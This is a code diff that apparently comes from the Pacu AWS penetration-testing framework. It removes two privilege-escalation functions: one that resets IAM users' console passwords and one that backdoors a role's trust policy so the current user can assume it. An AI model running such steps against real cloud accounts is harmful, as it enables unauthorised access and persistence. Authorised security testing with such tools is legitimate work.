@@ -1144,45 +1144,6 @@ def CreateLoginProfile(pacu_main, print, input, fetch_data):
     return True
 
 
-def UpdateLoginProfile(pacu_main, print, input, fetch_data):
-    session = pacu_main.get_active_session()
-
-    print('  Starting method UpdateLoginProfile...\n')
-
-    username = input('    Is there a specific user you want to target? They must already have a login profile (password for logging into the AWS Console). Enter their user name now or just hit enter to enumerate users and view a list of options: ')
-    if fetch_data(['IAM', 'Users'], module_info['prerequisite_modules'][1], '--users') is False:
-        print('Pre-req module not run successfully. Exiting...')
-        return False
-    users = session.IAM['Users']
-    print('Found {} user(s). Choose a user below.'.format(len(users)))
-    print('  [0] Other (Manually enter user name)')
-    print('  [1] All Users')
-    for i in range(0, len(users)):
-        print('  [{}] {}'.format(i + 2, users[i]['UserName']))
-    choice = input('Choose an option: ')
-    if int(choice) == 0:
-        username = input('    Enter a user name: ')
-    else:
-        username = users[int(choice) - 2]['UserName']
-
-    try:
-        if int(choice) == 1:
-            user_string = ''
-            for user in users:
-                user_string = '{},{}'.format(user_string, user['UserName'])  # Prepare username list for backdoor_users_password
-            user_string = user_string[1:]  # Remove first comma
-            fetch_data(None, module_info['prerequisite_modules'][3], '--update --usernames {}'.format(user_string), force=True)
-        else:
-            fetch_data(None, module_info['prerequisite_modules'][3], '--update --usernames {}'.format(username), force=True)
-        return True
-    except Exception as e:
-        print('      Failed to update the login profile for user {}: {}'.format(username, e))
-        again = input('    Do you want to try another user (y) or continue to the next privilege escalation method (n)? ')
-        if again == 'y':
-            print('      Re-running UpdateLoginProfile privilege escalation attempt...')
-            return UpdateLoginProfile(pacu_main, print, input, fetch_data)
-        else:
-            return False
 
 
 def AttachUserPolicy(pacu_main, print, input, fetch_data):
@@ -1413,43 +1374,6 @@ def AddUserToGroup(pacu_main, print, input, fetch_data):
         if again == 'y':
             print('      Re-running AddUserToGroup privilege escalation attempt...')
             return AddUserToGroup(pacu_main, print, input, fetch_data)
-        else:
-            return False
-
-
-def UpdateRolePolicyToAssumeIt(pacu_main, print, input, fetch_data):
-    session = pacu_main.get_active_session()
-
-    print('  Starting method UpdateRolePolicyToAssumeIt...\n')
-
-    target_role = input('    Is there a specific role to target? Enter the name now or just press enter to enumerate a list of possible roles to choose from: ')
-
-    if not target_role:
-        if fetch_data(['IAM', 'Roles'], module_info['prerequisite_modules'][1], '--roles', force=True) is False:
-            print('Pre-req module not run successfully. Exiting...')
-            return False
-        roles = deepcopy(session.IAM['Roles'])
-
-        print('Found {} roles. Choose one below.'.format(len(roles)))
-        for i in range(0, len(roles)):
-            print('  [{}] {}'.format(i, roles[i]['RoleName']))
-        choice = input('Choose an option: ')
-        target_role = roles[int(choice)]['RoleName']
-
-    print('Targeting role {}. Trying to backdoor access to it from the current user...'.format(target_role))
-
-    try:
-        if fetch_data(['Backdooring Roles'], module_info['prerequisite_modules'][4], '--role-names {}'.format(target_role), force=True) is False:
-            print('Pre-req module not run successfully. Exiting...')
-            return False
-        print('Successfully updated the assume-role-policy-document for role {}. You should now be able to assume that role to gain its privileges.\n'.format(target_role))
-        return True
-    except Exception as error:
-        print('Failed to update the assume-role-policy-document for role {}: {}\n'.format(target_role, error))
-        again = input('    Do you want to try another role (y) or continue to the next privilege escalation method (n)? ')
-        if again == 'y':
-            print('      Re-running UpdateRolePolicyToAssumeIt privilege escalation attempt...')
-            return UpdateRolePolicyToAssumeIt(pacu_main, print, input, fetch_data)
         else:
             return False
 
